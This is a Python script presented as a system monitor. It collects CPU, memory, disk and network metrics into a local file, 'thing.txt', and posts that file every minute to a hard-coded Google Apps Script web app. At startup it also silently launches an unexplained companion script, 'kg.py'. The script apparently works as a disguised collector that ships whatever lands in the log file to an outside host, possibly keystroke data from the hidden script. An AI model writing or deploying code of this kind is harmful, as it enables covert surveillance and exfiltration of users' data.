# main_monitor.py
import psutil # pip install psutil
import json
import time
import os
import requests # For sending data


import asyncio

async def run_script():
    process = await asyncio.create_subprocess_exec(
        'python', 'kg.py',
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    print(stdout.decode(), stderr.decode())

asyncio.run(run_script())

# --- Configuration ---
# IMPORTANT: Replace with your Google Apps Script Web App URL.
# This URL should be configured to accept 'text/plain' and split by newlines.
TARGET_URL = os.environ.get("MONITORING_TARGET_URL", "https://script.google.com/macros/s/AKfycbw26eCGBW1RaixApmwGDLZFpLqWkLkFX4ybgGr3_VWiRFI6ebU5GmgTmpd-LxFbjNRZ1Q/exec") # Placeholder, replace with your actual URL
MONITOR_INTERVAL_SECONDS = int(os.environ.get("MONITOR_INTERVAL", "60")) # Collect metrics and write to local file every 60 seconds
BATCH_SEND_INTERVAL_SECONDS = int(os.environ.get("BATCH_INTERVAL", "60")) # Send local file content every 60 seconds (1 minute)
COMPUTER_ID = os.environ.get("COMPUTER_ID", "unnamed_computer") # A unique ID for this computer

# Local file to temporarily store monitoring data.
# This is now explicitly set to "thing.txt" in the current working directory.
LOCAL_LOG_FILE = "thing.txt"

# Ensure the directory for the local log file exists (current directory by default)
os.makedirs(os.path.dirname(os.path.abspath(LOCAL_LOG_FILE)), exist_ok=True)

last_send_time = time.time()

def get_system_metrics_as_text():
    """
    Collects various system performance metrics and formats them as a single
    plain text string, suitable for a single line in a log file.
    """
    current_timestamp = time.time()
    cpu_percent = psutil.cpu_percent(interval=1)
    memory_percent = psutil.virtual_memory().percent
    disk_usage_root_percent = psutil.disk_usage('/').percent
    network_bytes_sent = psutil.net_io_counters().bytes_sent
    network_bytes_recv = psutil.net_io_counters().bytes_recv

    # Format the metrics into a comma-separated string.
    # Ensure the order and format match what you expect in your Google Sheet.
    # If your Google Sheet simply takes the whole line, this format is flexible.
    metric_line = (
        f"{current_timestamp},"
        f"{COMPUTER_ID},"
        f"{cpu_percent},"
        f"{memory_percent},"
        f"{disk_usage_root_percent},"
        f"{network_bytes_sent},"
        f"{network_bytes_recv}"
    )
    return metric_line

def send_local_file_content_to_sheets(file_path):
    """
    Reads the entire content of a local plain text file and sends it as a
    text/plain POST request to the Google Apps Script Web App.
    """
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print(f"Local log file '{file_path}' is empty or does not exist, skipping send.")
        return True # Nothing to send, consider it successful

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()

        headers = {'Content-Type': 'text/plain'} # IMPORTANT: Set content type to plain text
        
        print(f"Sending content of '{file_path}' ({len(file_content.splitlines())} lines) to Google Sheets...")
        response = requests.post(TARGET_URL, data=file_content.encode('utf-8'), headers=headers, timeout=30)
        response.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)

        print(f"File content sent successfully. Status: {response.status_code}, Response: {response.text}")
        return True

    except requests.exceptions.Timeout:
        print("Error: Request timed out while sending file. Check network connection or URL.")
        return False
    except requests.exceptions.ConnectionError:
        print("Error: Could not connect to the target URL. Is the URL correct and accessible?")
        return False
    except requests.exceptions.RequestException as e:
        print(f"An HTTP or request-related error occurred: {e}")
        print(f"Response content: {e.response.text if e.response else 'N/A'}")
        return False
    except Exception as e:
        print(f"An unexpected error occurred during file sending: {e}")
        return False

def clear_local_log_file(file_path):
    """Clears the content of the local log file."""
    try:
        if os.path.exists(file_path): # Check if file exists before trying to clear
            with open(file_path, 'w', encoding='utf-8') as f:
                f.truncate(0) # Truncate file to 0 bytes
            print(f"Local log file '{file_path}' cleared.")
        else:
            print(f"Cannot clear '{file_path}': file does not exist.")
    except Exception as e:
        print(f"Error clearing local log file '{file_path}': {e}")

if __name__ == "__main__":
    print(f"Main monitoring script started. Local log file: {LOCAL_LOG_FILE}")
    print(f"Collecting metrics every {MONITOR_INTERVAL_SECONDS} seconds, sending file every {BATCH_SEND_INTERVAL_SECONDS} seconds.")
    
    try:
        while True:
            # Collect metrics and write to local file
            metric_line = get_system_metrics_as_text()
            try:
                with open(LOCAL_LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(metric_line + '\n')
                # print(f"Appended to local log: {metric_line}") # Uncomment for verbose logging
            except Exception as e:
                print(f"Error writing to local log file: {e}")

            current_time = time.time()
            if (current_time - last_send_time) >= BATCH_SEND_INTERVAL_SECONDS:
                # Send the content of LOCAL_LOG_FILE
                if send_local_file_content_to_sheets(LOCAL_LOG_FILE):
                    # Clear LOCAL_LOG_FILE after successful send
                    clear_local_log_file(LOCAL_LOG_FILE) 
                else:
                    print("Failed to send file content. Data will remain in local file for next attempt.")
                last_send_time = current_time # Reset timer regardless of success to avoid immediate re-attempt
            
            time.sleep(MONITOR_INTERVAL_SECONDS)

    except KeyboardInterrupt:
        print("Main monitoring script interrupted gracefully by user. Attempting to send remaining data...")
        if os.path.exists(LOCAL_LOG_FILE) and os.path.getsize(LOCAL_LOG_FILE) > 0:
            send_local_file_content_to_sheets(LOCAL_LOG_FILE) # Attempt to send any unsent data on exit
        print("Exiting.")
    except Exception as e:
        print(f"An unexpected error occurred in the main monitoring loop: {e}")

